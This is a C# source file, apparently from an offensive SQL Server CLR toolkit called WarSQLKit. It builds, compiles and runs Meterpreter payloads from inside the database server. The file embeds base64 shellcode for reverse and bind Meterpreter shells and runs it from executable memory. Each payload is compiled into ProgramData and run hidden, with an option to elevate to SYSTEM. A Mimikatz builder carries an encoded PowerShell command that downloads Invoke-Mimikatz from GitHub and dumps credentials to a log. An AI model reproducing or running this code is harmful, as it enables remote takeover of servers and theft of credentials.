using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.SqlServer.Server;

namespace WarSQLKit
{
    class MeterpreterBuilder
    {
        public string Ip = string.Empty;
        public string Port = string.Empty;
        public bool IsRunSystemPriv = false;
        private static List<string> _netFrameworkList = new List<string>();
        private static List<string> _x64NetFrameworkList = new List<string>();
        [Microsoft.SqlServer.Server.SqlProcedure]
        public void SaveReverseMeterpreter()
        {
            var randomFileName = RandomFileName(0, 12);
            SqlContext.Pipe.Send("Meterpreter C# File is being created.");
            var strMtr = "using System;" + 
                     "using System.Runtime.InteropServices;" +
                     "using System.Threading.Tasks;" +

                     "namespace WarSQLKit_Builder" +
                     "{" +
                     "class ReverseMeterpreter" +
                     "{" +
                     "static void Main(string[] args)" +
                     "{" +
                     "Task.Factory.StartNew(() => RunMeterpreter(\""+ Ip +"\", \""+ Port +"\"));" +
                     "var str = Convert.ToString(Console.ReadLine());" +
                     "}" +
                     "public static void RunMeterpreter(string ip, string port)" +
                     "{" +
                     "try" +
                     "{" +
                     "var ipOctetSplit = ip.Split('.');" +
                     "byte octByte1 = Convert.ToByte(ipOctetSplit[0]);" +
                     "byte octByte2 = Convert.ToByte(ipOctetSplit[1]);" +
                     "byte octByte3 = Convert.ToByte(ipOctetSplit[2]);" +
                     "byte octByte4 = Convert.ToByte(ipOctetSplit[3]);" +
                     "int inputPort = Int32.Parse(port);" +
                     "byte port1Byte = 0x00;" +
                     "byte port2Byte = 0x00;" +
                     "if (inputPort > 256)" +
                     "{" +
                     "int portOct1 = inputPort / 256;" +
                     "int portOct2 = portOct1 * 256;" +
                     "int portOct3 = inputPort - portOct2;" +
                     "int portoct1Calc = portOct1 * 256 + portOct3;" +
                     "if (inputPort == portoct1Calc)" +
                     "{" +
                     "port1Byte = Convert.ToByte(portOct1);" +
                     "port2Byte = Convert.ToByte(portOct3);" +
                     "}" +
                     "}" +
                     "else"+
                     "{"+
                     "port1Byte = 0x00;" +
                     "port2Byte = Convert.ToByte(inputPort);" +
                     "}"+
                     "byte[] shellCodePacket = new byte[9];" +
                     "shellCodePacket[0] = octByte1;" +
                     "shellCodePacket[1] = octByte2;" +
                     "shellCodePacket[2] = octByte3;" +
                     "shellCodePacket[3] = octByte4;" +
                     "shellCodePacket[4] = 0x68;" +
                     "shellCodePacket[5] = 0x02;" +
                     "shellCodePacket[6] = 0x00;" +
                     "shellCodePacket[7] = port1Byte;" +
                     "shellCodePacket[8] = port2Byte;" +
                     "string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKiLhmgCANkDieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8M=\";" +

                     "string s3 = Convert.ToBase64String(shellCodePacket);" +
                     "string newShellCode = shellCodeRaw.Replace(\"wKiLhmgCANkD\", s3);" +
                     "byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);" +
                     "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                     "Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);" +
                     "IntPtr hThread = IntPtr.Zero;" +
                     "UInt32 threadId = 0;" +
                     "IntPtr pinfo = IntPtr.Zero;" +
                     "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
                     "WaitForSingleObject(hThread, 0xFFFFFFFF);" +
                     "return;" +
                     "}" +
                     "catch (Exception e)" +
                     "{" +
                     "Console.WriteLine(e);" +
                     "throw;" +
                     "}" +
                     "}" +

                     "private static UInt32 MEM_COMMIT = 0x1000;" +
                     "private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
                     "[DllImport(\"kernel32\")]" +
                     "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                     "[DllImport(\"kernel32\")]" +
                     "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                     "[DllImport(\"kernel32\")]" +
                     "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +
                     "}" +
                     "}";
            NetFrameWorkDirectory();
            File.WriteAllText(@"C:\\ProgramData\\" + randomFileName + @"_reverse.cs", strMtr);
            SqlContext.Pipe.Send("Meterpreter C# File created.");
            SqlContext.Pipe.Send("CSharp Compiler is running.");
            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\Windows\Microsoft.NET\Framework\"+ _netFrameworkList[_netFrameworkList.Count - 1] +@"\csc.exe /unsafe /platform:x86 /out:C:\ProgramData\" + randomFileName + @"_reverse.exe " + @"C:\ProgramData\" + randomFileName + @"_reverse.cs");
            SqlContext.Pipe.Send("Meterpreter compiled.");
            File.Delete(@"C:\ProgramData\" + randomFileName + @"_reverse.cs");
            if (IsRunSystemPriv == true)
            {
                BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\\ProgramData\\Kumpir.exe C:\ProgramData\" + randomFileName + @"_reverse.exe");
            }
            else
            {
                BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\ProgramData\" + randomFileName + @"_reverse.exe");
            }
        }
        public void SaveBindMeterpreter()
        {
            var randomFileName = RandomFileName(0, 12);
            SqlContext.Pipe.Send("Meterpreter C# File is being created.");
            var strMtr = "using System;" +
                         "using System.Collections.Generic;" +
                         "using System.IO;" +
                         "using System.Runtime.InteropServices;" +
                         "using System.Text;" +
                         "using System.Threading;" +

                         "namespace WarSQLKit_Builder" +
                         "{" +
                         "class BindMeterpreter" +
                         "{" +
                         "static void Main(string[] args)" +
                         "{" +
                         " RunMeterpreter(\"" + Port + "\");" +
                         "var str = Convert.ToString(Console.ReadLine());" +
                         "}" +
                         "public static void RunMeterpreter(string port)" +
                         "{" +
                         "try" +
                         "{" +
                         "int inputPort = Int32.Parse(port);" +
                         "byte port1Byte = 0x00;" +
                         "byte port2Byte = 0x00;" +
                         "byte[] shellCodePacket = new byte[6];" +
                         "if (inputPort > 256)" +
                         "{" +
                         "int portOct1 = inputPort / 256;" +
                         "int portOct2 = portOct1 * 256;" +
                         "int portOct3 = inputPort - portOct2;" +
                         "int portoct1Calc = portOct1 * 256 + portOct3;" +
                         "if (inputPort == portoct1Calc)" +
                         "{" +
                         "port1Byte = Convert.ToByte(portOct1);" +
                         "port2Byte = Convert.ToByte(portOct3);" +
                         "shellCodePacket[0] = 0x68;" +
                         "shellCodePacket[1] = 0x02;" +
                         "shellCodePacket[2] = 0x00;" +
                         "shellCodePacket[3] = port1Byte;" +
                         "shellCodePacket[4] = port2Byte;" +
                         "shellCodePacket[5] = 0x89;" +
                         "}" +
                         "}" +
                         "else" +
                         "{" +
                         "shellCodePacket[0] = 0x68;" +
                         "shellCodePacket[1] = 0x02;" +
                         "shellCodePacket[2] = 0x00;" +
                         "shellCodePacket[3] = port1Byte;" +
                         "shellCodePacket[4] = Convert.ToByte(inputPort);" +
                         "shellCodePacket[5] = 0x89;" +
                         "}" +

                         "string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagtZUOL9agFqAmjqD9/g/9WXaAIAEVyJ5moQVldowts3Z//VhcB1WFdot+k4///VV2h07Dvh/9VXl2h1bk1h/9VqAGoEVldoAtnIX//Vg/gAfi2LNmpAaAAQAABWagBoWKRT5f/Vk1NqAFZTV2gC2chf/9WD+AB+BwHDKcZ16cM=\";" +

                         "string s3 = Convert.ToBase64String(shellCodePacket);" +
                         "string newShellCode = shellCodeRaw.Replace(\"aAIAEVyJ\", s3);" +
                         "byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);" +
                         "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                         "Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);" +
                         "IntPtr hThread = IntPtr.Zero;" +
                         "UInt32 threadId = 0;" +
                         "IntPtr pinfo = IntPtr.Zero;" +
                         "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
                         "WaitForSingleObject(hThread, 0xFFFFFFFF);" +
                         "return;" +
                         "}" +
                         "catch (Exception e)" +
                         "{" +
                         "Console.WriteLine(e);" +
                         "throw;" +
                         "}" +
                         "}" +

                         "private static UInt32 MEM_COMMIT = 0x1000;" +
                         "private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +
                         "}" +
                         "}";
            NetFrameWorkDirectory();
            File.WriteAllText(@"C:\\ProgramData\\" + randomFileName + @"_bind.cs", strMtr);
            SqlContext.Pipe.Send("Meterpreter C# File created.");
            SqlContext.Pipe.Send("CSharp Compiler is running.");
            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe",
                @" /c C:\Windows\Microsoft.NET\Framework\"+ _netFrameworkList[_netFrameworkList.Count - 1] + @"\csc.exe /unsafe /platform:x86 /out:C:\ProgramData\" +
                randomFileName + @"_bind.exe " + @"C:\ProgramData\" + randomFileName + @"_bind.cs");
            SqlContext.Pipe.Send("Meterpreter compiled.");
            File.Delete(@"C:\ProgramData\" + randomFileName + @"_bind.cs");
            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\ProgramData\" + randomFileName + @"_bind.exe");
        }
        public void Savex64ReverseMeterpreter()
        {
            var randomFileName = RandomFileName(0, 12);
            SqlContext.Pipe.Send("Meterpreter C# File is being created.");
            var strMtr = "using System;" +
                         "using System.Runtime.InteropServices;" +

                         "namespace WarSQLKit_Builder" +
                         "{" +
                         "class x64ReverseMeterpreter" +
                         "{" +
                         "static void Main(string[] args)" +
                         "{" +
                         "RunMeterpreter(\"" + Ip + "\", \"" + Port + "\");" +
                         "var str = Convert.ToString(Console.ReadLine());" +
                         "}" +
                         "public static void RunMeterpreter(string ip, string port)" +
                         "{" +
                         "try" +
                         "{" +
                         "var ipOctetSplit = ip.Split('.');" +
                         "byte octByte1 = Convert.ToByte(ipOctetSplit[0]);" +
                         "byte octByte2 = Convert.ToByte(ipOctetSplit[1]);" +
                         "byte octByte3 = Convert.ToByte(ipOctetSplit[2]);" +
                         "byte octByte4 = Convert.ToByte(ipOctetSplit[3]);" +

                         "int inputPort = Int32.Parse(port);" +
                         "byte port1Byte = 0x00;" +
                         "byte port2Byte = 0x00;" +
                         "byte[] shellCodePacket = new byte[9];" +
                         "shellCodePacket[0] = 0x00;" +
                         "if (inputPort > 256)" +
                         "{" +
                         "int portOct1 = inputPort / 256;" +
                         "int portOct2 = portOct1 * 256;" +
                         "int portOct3 = inputPort - portOct2;" +
                         "int portoct1Calc = portOct1 * 256 + portOct3;" +
                         "if (inputPort == portoct1Calc)" +
                         "{" +
                         "port1Byte = Convert.ToByte(portOct1);" +
                         "port2Byte = Convert.ToByte(portOct3);" +
                         "shellCodePacket[1] = port1Byte;" +
                         "shellCodePacket[2] = port2Byte;" +
                         "}" +
                         "}" +
                         "else" +
                         "{" +
                         "shellCodePacket[1] = port1Byte;" +
                         "shellCodePacket[2] = Convert.ToByte(inputPort);" +
                         "}" +
                         "shellCodePacket[3] = octByte1;" +
                         "shellCodePacket[4] = octByte2;" +
                         "shellCodePacket[5] = octByte3;" +
                         "shellCodePacket[6] = octByte4;" +
                         "shellCodePacket[7] = 0x41;" +
                         "shellCodePacket[8] = 0x54;" +

                         "string shellCodeRaw = \"/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKiLgUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dY\";" +

                         "string s3 = Convert.ToBase64String(shellCodePacket);" +
                         "string newShellCode = shellCodeRaw.Replace(\"ABFcwKiLgUFU\", s3);" +
                         "byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);" +
                         "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                         "Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);" +
                         "IntPtr hThread = IntPtr.Zero;" +
                         "UInt32 threadId = 0;" +
                         "IntPtr pinfo = IntPtr.Zero;" +
                         "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
                         "WaitForSingleObject(hThread, 0xFFFFFFFF);" +
                         "return;" +
                         "}" +
                         "catch (Exception e)" +
                         "{" +
                         "Console.WriteLine(e);" +
                         "throw;" +
                         "}" +
                         "}" +

                         "private static UInt32 MEM_COMMIT = 0x1000;" +
                         "private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +
                         "}" +
                         "}";
            x64NetFrameWorkDirectory();
            File.WriteAllText(@"C:\\ProgramData\\" + randomFileName + @"_x64_reverse.cs", strMtr);
            SqlContext.Pipe.Send("Meterpreter C# File created.");
            SqlContext.Pipe.Send("CSharp Compiler is running.");
            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\Windows\Microsoft.NET\Framework64\" + _x64NetFrameworkList[_x64NetFrameworkList.Count - 1] + @"\csc.exe /unsafe /platform:x64 /out:C:\ProgramData\" + randomFileName + @"_x64_reverse.exe " + @"C:\ProgramData\" + randomFileName + @"_x64_reverse.cs");
            SqlContext.Pipe.Send("Meterpreter compiled.");
            File.Delete(@"C:\ProgramData\" + randomFileName + @"_x64_reverse.cs");
            if (IsRunSystemPriv == true)
            {
                BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\\ProgramData\\Kumpir.exe C:\ProgramData\" + randomFileName + @"_x64_reverse.exe");
            }
            else
            {
                BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\ProgramData\" + randomFileName + @"_x64_reverse.exe");
            }
        }
        public void SaveMeterpreterRc4()
        {
            var randomFileName = RandomFileName(0, 12);
            SqlContext.Pipe.Send("Meterpreter C# File is being created.");
            var strMtr = "using System;" +
                         "using System.Runtime.InteropServices;" +

                         "namespace WarSQLKit_Builder" +
                         "{" +
                         "class MeterpreterRc4" +
                         "{" +
                         "static void Main(string[] args)" +
                         "{" +
                         "RunMeterpreter(\"" + Ip + "\", \"" + Port + "\");" +
                         "var str = Convert.ToString(Console.ReadLine());" +
                         "}" +
                         "public static void RunMeterpreter(string ip, string port)" +
                         "{" +
                         "try" +
                         "{" +
                         "var ipOctetSplit = ip.Split('.');" +
                         "byte octByte1 = Convert.ToByte(ipOctetSplit[0]);" +
                         "byte octByte2 = Convert.ToByte(ipOctetSplit[1]);" +
                         "byte octByte3 = Convert.ToByte(ipOctetSplit[2]);" +
                         "byte octByte4 = Convert.ToByte(ipOctetSplit[3]);" +

                         "int inputPort = Int32.Parse(port);" +
                         "byte port1Byte = 0x00;" +
                         "byte port2Byte = 0x00;" +
                         "byte[] shellCodePacket = new byte[15];" +
                         "shellCodePacket[0] = 0x6a;" +
                         "shellCodePacket[1] = 0x05;" +
                         "shellCodePacket[2] = 0x68;" +
                         "shellCodePacket[3] = octByte1;" +
                         "shellCodePacket[4] = octByte2;" +
                         "shellCodePacket[5] = octByte3;" +
                         "shellCodePacket[6] = octByte4;" +
                         "shellCodePacket[7] = 0x68;" +
                         "shellCodePacket[8] = 0x02;" +
                         "shellCodePacket[9] = 0x00;" +
                         "if (inputPort > 256)" +
                         "{" +
                         "int portOct1 = inputPort / 256;" +
                         "int portOct2 = portOct1 * 256;" +
                         "int portOct3 = inputPort - portOct2;" +
                         "int portoct1Calc = portOct1 * 256 + portOct3;" +
                         "if (inputPort == portoct1Calc)" +
                         "{" +
                         "port1Byte = Convert.ToByte(portOct1);" +
                         "port2Byte = Convert.ToByte(portOct3);" +
                         "shellCodePacket[10] = port1Byte;" +
                         "shellCodePacket[11] = port2Byte;" +
                         "}" +
                         "}" +
                         "else" +
                         "{" +
                         "shellCodePacket[10] = port1Byte;" +
                         "shellCodePacket[11] = Convert.ToByte(inputPort);" +
                         "}" +
                         "shellCodePacket[12] = 0x89;" +
                         "shellCodePacket[13] = 0xe6;" +
                         "shellCodePacket[14] = 0x50;" +

                         "string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKiLhmgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04Idezo1gAAAGoAagRWV2gC2chf/9WD+AB+SYs2gfbrYEhjjY4AAQAAakBoABAAAFFqAGhYpFPl/9WNmAABAABTVlBqAFZTV2gC2chf/9WD+AB9IlhoAEAAAGoAUGgLLw8w/9VXaHVuTWH/1V5e/wwk6V7///8BwynGdcdbWV1VV4nf6BAAAADdV2PPqbQaL1HF9q6xpi5lXjHAqv7AdfuB7wABAAAx2wIcB4nCgOIPAhwWihQHhhQfiBQH/sB16DHb/sACHAeKFAeGFB+IFAcCFB+KFBcwVQBFSXXlX8M=\";" +

                         "string s3 = Convert.ToBase64String(shellCodePacket);" +
                         "string newShellCode = shellCodeRaw.Replace(\"agVowKiLhmgCABFcieZQ\", s3);" +
                         "byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);" +
                         "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                         "Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);" +
                         "IntPtr hThread = IntPtr.Zero;" +
                         "UInt32 threadId = 0;" +
                         "IntPtr pinfo = IntPtr.Zero;" +
                         "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
                         "WaitForSingleObject(hThread, 0xFFFFFFFF);" +
                         "return;" +
                         "}" +
                         "catch (Exception e)" +
                         "{" +
                         "Console.WriteLine(e);" +
                         "throw;" +
                         "}" +
                         "}" +

                         "private static UInt32 MEM_COMMIT = 0x1000;" +
                         "private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +

                         "}" +
                         "}";
            NetFrameWorkDirectory();
            File.WriteAllText(@"C:\\ProgramData\\" + randomFileName + @"_rc4.cs", strMtr);
            SqlContext.Pipe.Send("Meterpreter C# File created.");
            SqlContext.Pipe.Send("CSharp Compiler is running.");
            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\Windows\Microsoft.NET\Framework\"+ _netFrameworkList[_netFrameworkList.Count - 1] + @"\csc.exe /unsafe /platform:x86 /out:C:\ProgramData\" + randomFileName + @"_rc4.exe " + @"C:\ProgramData\" + randomFileName + @"_rc4.cs");
            SqlContext.Pipe.Send("Meterpreter compiled.");
            File.Delete(@"C:\ProgramData\" + randomFileName + @"_rc4.cs");
            if (IsRunSystemPriv == true)
            {
                BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\\ProgramData\\Kumpir.exe C:\ProgramData\" + randomFileName + @"_rc4.exe");
            }
            else
            {
                BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\ProgramData\" + randomFileName + @"_rc4.exe");
            }
        }
        public void SaveMimikatz()
        {
            SqlContext.Pipe.Send("Mimikatz C# File is being created.");
            var strMtr = "using System;" +
                         "using System.Diagnostics;" +
                         "using System.Text;" +
                         "namespace Meterpreter_Test3" +
                         "{" +
                         "class Program" +
                         "{" +
                         "static void Main(string[] args)" +
                         "{" +
                         "RunMimikatz(\"cmd.exe\", \"/c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA== > C:\\\\ProgramData\\\\mimi.log 2>&1\");" +
                         "}" +
                         "public static void RunMimikatz(string filename, string arguments)" +
                         "{" +
                         "var process = new Process();" +
                         "process.StartInfo.FileName = filename;" +
                         "if (!string.IsNullOrEmpty(arguments))" +
                         "{" +
                         "process.StartInfo.Arguments = arguments;" +
                         "}" +
                         "process.StartInfo.CreateNoWindow = true;" +
                         "process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;" +
                         "process.StartInfo.UseShellExecute = false;" +
                         "process.StartInfo.RedirectStandardError = true;" +
                         "process.StartInfo.RedirectStandardOutput = true;" +
                         "var stdOutput = new StringBuilder();" +
                         "process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);" +
                         "string stdError = null;" +
                         "try" +
                         "{" +
                         "process.Start();" +
                         "process.BeginOutputReadLine();" +
                         "stdError = process.StandardError.ReadToEnd();" +
                         "process.WaitForExit();" +
                         "}" +
                         "catch (Exception e)" +
                         "{" +
                         "}" +
                         "if (process.ExitCode == 0)" +
                         "{" +
                         "}" +
                         "else" +
                         "{" +
                         "var message = new StringBuilder();" +
                         "if (!string.IsNullOrEmpty(stdError))" +
                         "{" +
                         "message.AppendLine(stdError);" +
                         "}" +
                         "if (stdOutput.Length != 0)" +
                         "{" +
                         "message.AppendLine(\"Std output:\");" +
                         "message.AppendLine(stdOutput.ToString());" +
                         "}" +
                         "}" +
                         "}" +
                         "}" +
                         "}";
            x64NetFrameWorkDirectory();
            File.WriteAllText(@"C:\ProgramData\mimiPs.cs", strMtr);
            SqlContext.Pipe.Send("Mimikatz C# File created.");
            SqlContext.Pipe.Send("CSharp Compiler is running.");
            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\Windows\Microsoft.NET\Framework64\"+ _x64NetFrameworkList[_x64NetFrameworkList.Count - 1] + @"\csc.exe /unsafe /platform:x64 /out:C:\ProgramData\MimiPs.exe " + @"C:\ProgramData\mimiPs.cs");
            SqlContext.Pipe.Send("Mimikazt compiled.");
            File.Delete(@"C:\ProgramData\mimiPs.cs");
        }
        public static void NetFrameWorkDirectory()
        {
            _netFrameworkList.Clear();
            string targetDirectory = @"C:\Windows\Microsoft.NET\Framework";
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            for (int i = 0; i < subdirectoryEntries.Length; i++)
            {
                string[] versionStrings = subdirectoryEntries[i].Split('\\');
                if (versionStrings[(versionStrings.Length - 1)].StartsWith("v"))
                {
                    if (versionStrings[(versionStrings.Length - 1)].StartsWith("VJ"))
                        return;
                    _netFrameworkList.Add(versionStrings[(versionStrings.Length - 1)]);
                }
            }
        }
        public static void x64NetFrameWorkDirectory()
        {
            _x64NetFrameworkList.Clear();
            string targetDirectory = @"C:\Windows\Microsoft.NET\Framework64";
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            for (int i = 0; i < subdirectoryEntries.Length; i++)
            {
                string[] versionStrings = subdirectoryEntries[i].Split('\\');
                if (versionStrings[(versionStrings.Length - 1)].StartsWith("v"))
                {
                    if (versionStrings[(versionStrings.Length - 1)].StartsWith("VJ"))
                        return;
                    _x64NetFrameworkList.Add(versionStrings[(versionStrings.Length - 1)]);
                }
            }
        }
        public void BuildRunMeterpreter(string filename, string arguments)
        {
            var process = new Process();

            process.StartInfo.FileName = filename;
            if (!string.IsNullOrEmpty(arguments))
            {
                process.StartInfo.Arguments = arguments;
            }

            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.UseShellExecute = false;

            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            var stdOutput = new StringBuilder();
            process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
            string stdError = null;
            try
            {
                process.Start();
                process.BeginOutputReadLine();
                stdError = process.StandardError.ReadToEnd();
                process.WaitForExit();
            }
            catch (Exception e)
            {
                SqlContext.Pipe.Send(e.Message);
            }

            if (process.ExitCode == 0)
            {
                //SqlContext.Pipe.Send(stdOutput.ToString());
            }
            else
            {
                var message = new StringBuilder();

                if (!string.IsNullOrEmpty(stdError))
                {
                    message.AppendLine(stdError);
                }

                if (stdOutput.Length != 0)
                {
                    message.AppendLine("Std output:");
                    message.AppendLine(stdOutput.ToString());
                }
            }
        }
        public static string RandomFileName(int start, int end)
        {
            var rnd = new Random();
            var chr = "0123456789ABCDEFGHIJKLMNOPRSTUVWXYZ".ToCharArray();
            var randomFName = string.Empty;
            for (var i = start; i < end; i++)
            {
                randomFName += chr[rnd.Next(0, chr.Length - 1)].ToString();
            }
            return randomFName;
        }
    }
}
